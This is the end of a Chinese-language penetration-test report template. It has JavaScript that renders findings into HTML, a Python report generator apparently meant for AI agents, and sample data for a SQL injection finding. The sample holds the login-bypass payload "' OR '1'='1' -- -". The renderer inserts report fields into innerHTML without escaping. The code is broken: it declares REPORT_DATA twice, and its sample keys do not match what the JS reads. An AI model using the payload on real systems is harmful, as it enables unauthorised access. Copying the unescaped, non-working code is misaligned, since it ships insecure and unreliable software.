    const sevMap = { 'Critical': '🔴 严重', 'High': '🟠 高危', 'Medium': '🟡 中危', 'Low': '🔵 低危', 'Info': '⚪ 信息' };
    d.summary.key_findings.forEach((f, i) => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${i+1}</td><td><strong>${f.title}</strong></td><td>${sevMap[f.severity] || f.severity}</td><td>${f.impact}</td>`;
        ef.appendChild(tr);
    });

    // 测试范围
    const st = document.getElementById('scope-targets');
    const scopeItems = [
        { url: 'https://app.example.com', type: 'Web应用', method: '黑盒+灰盒' },
        { url: 'https://api.example.com/v1', type: 'REST API', method: '灰盒' },
        { url: 'https://admin.example.com', type: '管理后台', method: '黑盒' },
    ];
    scopeItems.forEach((item, i) => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${i+1}</td><td>${item.url}</td><td>${item.type}</td><td>${item.method}</td>`;
        st.appendChild(tr);
    });

    // 严重性分布表
    const stTable = document.getElementById('severity-table');
    const sevLabels = ['严重 (Critical)', '高危 (High)', '中危 (Medium)', '低危 (Low)', '信息 (Info)'];
    const cvssRanges = ['9.0 - 10.0', '7.0 - 8.9', '4.0 - 6.9', '0.1 - 3.9', '0.0'];
    const sevKeys = ['critical', 'high', 'medium', 'low', 'info'];
    sevLabels.forEach((label, i) => {
        const count = d.summary[sevKeys[i]] || 0;
        const pct = d.summary.total > 0 ? (count / d.summary.total * 100).toFixed(1) : 0;
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${['🔴','🟠','🟡','🔵','⚪'][i]} ${label}</td>
            <td>${cvssRanges[i]}</td>
            <td>${count}</td>
            <td>${pct}%</td>
            <td><div class="progress-bar"><div class="fill" style="width:${pct}%;background:${d.severity_data.colors[i]}"></div></div></td>
        `;
        stTable.appendChild(tr);
    });

    // 系统分布表
    const sysTable = document.getElementById('system-table');
    let sysTotal = { critical: 0, high: 0, medium: 0, low: 0 };
    d.systems.forEach(sys => {
        const total = sys.critical + sys.high + sys.medium + sys.low;
        sysTotal.critical += sys.critical;
        sysTotal.high += sys.high;
        sysTotal.medium += sys.medium;
        sysTotal.low += sys.low;
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${sys.name}</td><td>${sys.critical}</td><td>${sys.high}</td><td>${sys.medium}</td><td>${sys.low}</td><td><strong>${total}</strong></td>`;
        sysTable.appendChild(tr);
    });
    const totalRow = document.createElement('tr');
    totalRow.style.background = 'var(--bg-body)';
    totalRow.innerHTML = `<td><strong>合计</strong></td><td>${sysTotal.critical}</td><td>${sysTotal.high}</td><td>${sysTotal.medium}</td><td>${sysTotal.low}</td><td><strong>${sysTotal.critical+sysTotal.high+sysTotal.medium+sysTotal.low}</strong></td>`;
    sysTable.appendChild(totalRow);

    // 漏洞详情
    const fc = document.getElementById('findings-container');
    const sevClass = { 'Critical': 'critical', 'High': 'high', 'Medium': 'medium', 'Low': 'low', 'Info': 'info' };
    d.findings.forEach((f, i) => {
        const card = document.createElement('div');
        card.className = `finding-card ${sevClass[f.severity] || 'info'}`;
        const severityIcon = { 'Critical': '🔴', 'High': '🟠', 'Medium': '🟡', 'Low': '🔵', 'Info': '⚪' };
        let stepsHtml = '';
        if (f.steps && f.steps.length) {
            stepsHtml = '<h4>复现步骤</h4><ol>' + f.steps.map(s => `<li>${s}</li>`).join('') + '</ol>';
        }
        let pocHtml = '';
        if (f.poc) {
            pocHtml = `<h4>POC 请求</h4><pre><code>${f.poc.replace(/</g, '&lt;')}</code></pre>`;
        }
        card.innerHTML = `
            <div class="finding-header">
                <h3>${i+1}. ${severityIcon[f.severity]} ${f.title}</h3>
                <span class="severity-badge ${sevClass[f.severity]}">${severityIcon[f.severity]} ${f.severity} | CVSS ${f.cvss}</span>
            </div>
            <dl class="finding-meta">
                <dt>漏洞编号</dt><dd>${f.id}</dd>
                <dt>受影响组件</dt><dd>${f.component}</dd>
                <dt>漏洞类型</dt><dd>${f.type}</dd>
                <dt>CWE编号</dt><dd>${f.cwe}</dd>
                <dt>OWASP分类</dt><dd>${f.owasp}</dd>
                <dt>当前状态</dt><dd>${f.status}</dd>
            </dl>
            <div class="finding-section">
                <h4>漏洞描述</h4>
                <p>${f.description}</p>
            </div>
            ${stepsHtml}
            ${pocHtml}
            <div class="finding-section">
                <h4>影响范围</h4>
                <p>${f.impact}</p>
            </div>
            <div class="finding-section">
                <h4>修复建议</h4>
                <p><strong>短期修复：</strong>${f.remediation_short}</p>
                <p><strong>长期修复：</strong>${f.remediation_long}</p>
            </div>
        `;
        fc.appendChild(card);
    });

    // 修复建议表
    const rt = document.getElementById('remediation-table');
    const priorityMap = { 'Critical': 'P0 🔴', 'High': 'P1 🟠', 'Medium': 'P2 🟡', 'Low': 'P3 🔵', 'Info': 'P3 🔵' };
    const deadlineMap = { 'Critical': '24小时内', 'High': '1周内', 'Medium': '2周内', 'Low': '1个月内', 'Info': '1个月内' };
    d.findings.forEach(f => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${priorityMap[f.severity] || 'P2 🟡'}</td><td>${f.id}</td><td>${f.title}</td><td>${f.cvss}</td><td>${deadlineMap[f.severity] || 'N/A'}</td>`;
        rt.appendChild(tr);
    });

    // 时间戳
    document.getElementById('generated-time').textContent = new Date().toLocaleString('zh-CN');

    // 图表
    initCharts();
}

// ===== 图表 =====
let charts = [];
function initCharts() {
    const d = REPORT_DATA;

    // 严重性饼图
    const ctx1 = document.getElementById('severityChart').getContext('2d');
    charts.push(new Chart(ctx1, {
        type: 'doughnut',
        data: {
            labels: d.severity_data.labels,
            datasets: [{
                data: d.severity_data.counts,
                backgroundColor: d.severity_data.colors,
                borderColor: 'transparent'
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { position: 'bottom' }
            }
        }
    }));

    // 类型柱状图
    const ctx2 = document.getElementById('typeChart').getContext('2d');
    charts.push(new Chart(ctx2, {
        type: 'bar',
        data: {
            labels: d.type_data.labels,
            datasets: [{
                label: '漏洞数量',
                data: d.type_data.counts,
                backgroundColor: d.type_data.colors,
                borderRadius: 4
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: { display: false }
            },
            scales: {
                y: { beginAtZero: true, ticks: { stepSize: 1 } }
            }
        }
    }));
}

// 页面加载
document.addEventListener('DOMContentLoaded', initReport);
</script>

</body>
</html>
```

---

## AI Agent 调用示例

```python
#!/usr/bin/env python3
"""
html_report_generator_agent.py
AI Agent 调用示例：程序化生成 HTML 安全报告
"""

import json
import os
from datetime import date
from typing import List, Dict, Optional


class HTMLReportGenerator:
    """HTML 安全报告生成器 - AI Agent 原生接口"""

    SEVERITY_ORDER = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}

    def __init__(self, report_data: dict):
        self.data = report_data
        self.severity_colors = {
            "Critical": "critical", "High": "high",
            "Medium": "medium", "Low": "low", "Info": "info",
        }

    def _build_severity_js(self) -> str:
        """生成漏洞严重性统计数据 JS"""
        findings = self.data.get("findings", [])
        counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        type_counts = {}

        for f in findings:
            sev = f.get("severity", "Info").lower()
            if sev in counts:
                counts[sev] += 1
            vtype = f.get("vuln_type", "Other")
            type_counts[vtype] = type_counts.get(vtype, 0) + 1

        return json.dumps({
            "summary": {
                "total": len(findings),
                "critical": counts["critical"],
                "high": counts["high"],
                "medium": counts["medium"],
                "low": counts["low"],
                "info": counts["info"],
            },
            "severity_data": {
                "labels": ["严重", "高危", "中危", "低危", "信息"],
                "counts": [counts["critical"], counts["high"],
                           counts["medium"], counts["low"], counts["info"]],
                "colors": ["#dc3545", "#fd7e14", "#ffc107", "#0d6efd", "#6c757d"],
            },
            "type_data": {
                "labels": list(type_counts.keys()),
                "counts": list(type_counts.values()),
                "colors": ["#dc3545", "#fd7e14", "#ffc107", "#0d6efd",
                           "#6c757d", "#20c997", "#17a2b8", "#6610f2"],
            },
        }, ensure_ascii=False)

    def _build_findings_js(self) -> str:
        """生成漏洞详情数据 JS"""
        findings = sorted(
            self.data.get("findings", []),
            key=lambda f: self.SEVERITY_ORDER.get(f.get("severity", "Info"), 99),
        )
        return json.dumps(findings, ensure_ascii=False)

    def _build_report_js(self) -> str:
        """生成报告完整数据 JS"""
        meta = self.data.get("report_meta", {})
        summary = self.data.get("executive_summary", {})
        return json.dumps({
            "meta": {
                "client_name": meta.get("client_name", ""),
                "test_start": meta.get("test_start", ""),
                "test_end": meta.get("test_end", ""),
                "tester": meta.get("tester", ""),
                "version": meta.get("version", "v1.0"),
                "report_date": meta.get("report_date", str(date.today())),
                "classification": meta.get("classification", "机密"),
            },
            "summary": {
                "total": summary.get("total_findings", 0),
                "critical": summary.get("critical_count", 0),
                "high": summary.get("high_count", 0),
                "medium": summary.get("medium_count", 0),
                "low": summary.get("low_count", 0),
                "info": summary.get("info_count", 0),
                "text": summary.get("overview", ""),
                "key_findings": summary.get("key_findings", []),
            },
            "systems": self.data.get("systems", []),
        }, ensure_ascii=False)

    def generate(self, output_path: str = "security_report.html"):
        """生成 HTML 报告文件"""
        # 读取模板 HTML
        template_path = os.path.join(os.path.dirname(__file__), "安全报告模板-HTML.md")
        with open(template_path, "r", encoding="utf-8") as f:
            content = f.read()

        # 提取 HTML 部分（在 ```html ... ``` 代码块中）
        start_marker = "```html"
        end_marker = "```"
        html_start = content.find(start_marker)
        html_end = content.find(end_marker, html_start + len(start_marker))
        if html_start == -1:
            raise ValueError("Template HTML not found")
        html_start += len(start_marker)
        html_template = content[html_start:html_end].strip()

        # 注入数据
        js_data = f"""
<script>
const REPORT_DATA = {self._build_report_js()};
REPORT_DATA.severity_data = {self._build_severity_js()}.severity_data;
REPORT_DATA.type_data = {self._build_severity_js()}.type_data;
REPORT_DATA.findings = {self._build_findings_js()};
</script>
"""
        # 替换模板中的 REPORT_DATA 定义
        html_template = html_template.replace(
            "const REPORT_DATA = {",
            js_data.strip() + "\nconst REPORT_DATA = {"
        )

        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or ".", exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(html_template)
        print(f"[+] HTML report generated: {output_path}")

    @staticmethod
    def from_json(json_path: str, output_path: str = "report.html"):
        """从 JSON 文件生成报告"""
        with open(json_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        generator = HTMLReportGenerator(data)
        generator.generate(output_path)

    @staticmethod
    def batch_generate(reports_dir: str, output_dir: str = "./reports"):
        """批量生成报告"""
        os.makedirs(output_dir, exist_ok=True)
        for filename in os.listdir(reports_dir):
            if filename.endswith(".json"):
                input_path = os.path.join(reports_dir, filename)
                output_name = filename.replace(".json", ".html")
                output_path = os.path.join(output_dir, output_name)
                HTMLReportGenerator.from_json(input_path, output_path)
                print(f"[+] Generated: {output_path}")


# ===== 使用示例 =====
if __name__ == "__main__":
    data = {
        "report_meta": {
            "report_id": "REP-2024-001",
            "project_id": "PT-2024-001",
            "client_name": "示例科技有限公司",
            "classification": "机密",
            "version": "v1.0",
            "tester": "张三",
            "reviewer": "李四",
            "approver": "王五",
            "test_start": "2024-06-01",
            "test_end": "2024-06-10",
            "report_date": "2024-06-15",
        },
        "executive_summary": {
            "overview": "本次安全评估共发现 <strong>9</strong> 个安全漏洞...",
            "risk_level": "高危",
            "total_findings": 9,
            "critical_count": 2,
            "high_count": 3,
            "medium_count": 2,
            "low_count": 1,
            "info_count": 1,
            "key_findings": [
                {"title": "SQL注入漏洞", "severity": "Critical", "impact": "可绕过认证获取全部用户数据"},
                {"title": "存储型XSS", "severity": "Critical", "impact": "可在管理后台执行任意JS"},
                {"title": "IDOR越权", "severity": "High", "impact": "可访问其他用户订单信息"},
            ],
        },
        "findings": [
            {
                "id": "VULN-001", "title": "SQL注入漏洞 - 登录接口",
                "severity": "Critical", "cvss_score": 9.8,
                "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "cve_id": "CVE-2024-XXXX", "cwe_id": "CWE-89",
                "owasp_category": "A03:2021 – Injection",
                "discovered_date": "2024-06-03",
                "affected_component": "/api/v1/login - username参数",
                "vuln_type": "SQL Injection",
                "description": "登录接口username参数未进行转义处理...",
                "reproduction_steps": [
                    "访问 https://app.example.com/login",
                    "在username参数注入: ' OR '1'='1' -- -",
                ],
                "poc": {"type": "http_request", "content": "POST /api/v1/login HTTP/1.1..."},
                "impact": "攻击者可绕过认证获取全部用户数据",
                "remediation": {
                    "short_term": "立即使用参数化查询替换字符串拼接",
                    "long_term": "引入ORM框架，实施输入验证白名单策略",
                    "priority": "P0", "deadline": "24小时内",
                },
                "references": [
                    "https://owasp.org/www-community/attacks/SQL_Injection",
                ],
                "status": "未修复",
            },
        ],
        "systems": [
            {"name": "主站 Web", "critical": 1, "high": 1, "medium": 1, "low": 0},
            {"name": "API 接口", "critical": 1, "high": 2, "medium": 1, "low": 0},
        ],
    }

    generator = HTMLReportGenerator(data)
    generator.generate("output_report.html")
```

---

## 特性说明

| 特性 | 技术实现 | 浏览器兼容性 |
|:---|:---|---:|
| 🌓 暗色模式切换 | CSS Variables + `data-theme` | 所有现代浏览器 |
| 📊 Chart.js 图表 | CDN 加载 Chart.js | 需网络加载 |
| 📑 侧边栏导航 | `scroll` 事件监听 | 所有浏览器 |
| 🖨️ 打印/PDF 导出 | `@media print` CSS + `window.print()` | 所有浏览器 |
| 📱 响应式布局 | CSS Grid + Media Queries | 所有现代浏览器 |
| 📈 动态数据渲染 | JavaScript DOM 操作 | 所有浏览器 |
| 🔒 本地存储 | `localStorage`（主题持久化） | 所有现代浏览器 |

## AI Agent 集成要点

| 能力 | 说明 |
|:---|:---|
| **输入** | 接受标准 JSON 数据（同 Markdown 模板的 JSON Schema） |
| **输出** | 生成完整 HTML 文件，可直接在浏览器打开或打印为 PDF |
| **调用方式** | `generator = HTMLReportGenerator(data)` → `generator.generate("report.html")` |
| **批量处理** | `HTMLReportGenerator.batch_generate(input_dir, output_dir)` |
| **自定义** | 可通过 CSS 变量覆盖品牌色和主题 |
| **离线使用** | 可下载 Chart.js 到本地，无需 CDN |

## 参考资源

- [Chart.js 文档](https://www.chartjs.org/docs/latest/)
- [HTML 打印媒体查询](https://developer.mozilla.org/zh-CN/docs/Web/CSS/@media/print)
- [CSS 自定义属性](https://developer.mozilla.org/zh-CN/docs/Web/CSS/Using_CSS_custom_properties)
- [Web 无障碍 (WCAG)](https://www.w3.org/TR/WCAG21/)
